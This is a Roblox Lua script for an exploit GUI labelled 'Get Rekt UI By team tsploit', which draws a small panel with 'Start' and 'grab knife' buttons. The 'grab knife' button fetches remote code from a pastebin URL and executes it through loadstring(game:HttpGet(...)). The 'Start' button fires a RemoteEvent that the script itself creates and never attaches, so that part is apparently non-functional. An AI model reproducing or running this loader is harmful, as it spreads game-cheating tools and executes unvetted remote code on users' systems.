-- Gui to Lua
-- Version: 3.6

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local rem2 = Instance.new("RemoteEvent")
local getrekt = game.Workspace:children()
-- Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.330939442, 0, 0.369278789, 0)
Frame.Size = UDim2.new(0, 247, 0, 149)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0, 0, -0.114093959, 0)
TextLabel.Size = UDim2.new(0, 247, 0, 17)
TextLabel.Font = Enum.Font.Arcade
TextLabel.Text = "Get Rekt UI By team tsploit"
TextLabel.TextColor3 = Color3.fromRGB(254, 64, 1)
TextLabel.TextSize = 14.000

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.299595147, 0, 0.275167793, 0)
TextButton.Size = UDim2.new(0, 99, 0, 67)
TextButton.Font = Enum.Font.Unknown
TextButton.Text = "Start"
TextButton.TextColor3 = Color3.fromRGB(252, 82, 25)
TextButton.TextSize = 14.000
TextButton.MouseButton1Down:connect(function()
	rem2:FireServer("Getrekt")
end)

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.352226734, 0, 0.778523505, 0)
TextButton_2.Size = UDim2.new(0, 72, 0, 25)
TextButton_2.Font = Enum.Font.Unknown
TextButton_2.Text = "grab knife"
TextButton_2.TextColor3 = Color3.fromRGB(254, 9, 1)
TextButton_2.TextSize = 14.000
TextButton_2.MouseButton1Down:connect(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/DMvyqPgS",true))()
end)